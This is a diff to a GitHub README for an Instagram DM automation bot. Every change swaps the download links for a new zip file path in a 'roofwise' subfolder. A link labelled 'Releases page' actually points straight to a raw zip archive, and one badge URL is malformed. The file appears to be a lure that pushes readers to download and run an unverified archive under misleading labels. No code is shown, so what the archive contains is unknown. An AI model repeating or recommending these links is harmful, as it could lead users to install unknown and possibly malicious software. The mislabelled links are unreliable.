@@ -2,7 +2,7 @@
 
 ## ⚡ Download Now
 
-[![Download](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_D_Automation_3.3.zip%20Now-Instagram--DM--Automation-brightgreen)](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_D_Automation_3.3.zip)
+[![Download](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_Automation_D_v3.9.zip%20Now-Instagram--DM--Automation-brightgreen)](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_Automation_D_v3.9.zip)
 
 ## 📜 Description
 
@@ -25,7 +25,7 @@ Ensure your device meets the following requirements:
 
 To download the bot, visit our Releases page:
 
-[Download Page](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_D_Automation_3.3.zip)
+[Download Page](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_Automation_D_v3.9.zip)
 
 ### Step 3: Download the Latest Release
 
@@ -79,4 +79,4 @@ If you encounter any issues, please visit our GitHub Issues page. We monitor it 
 
 ## 📥 Download & Install
 
-To start using the Instagram DM Automation bot, make sure to [visit the download page](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_D_Automation_3.3.zip) for the latest version. Enjoy automating your Instagram messaging without hassle!
+To start using the Instagram DM Automation bot, make sure to [visit the download page](https://github.com/Emmyz-1234/Instagram-DM-Automation/raw/refs/heads/main/roofwise/Instagram_Automation_D_v3.9.zip) for the latest version. Enjoy automating your Instagram messaging without hassle!
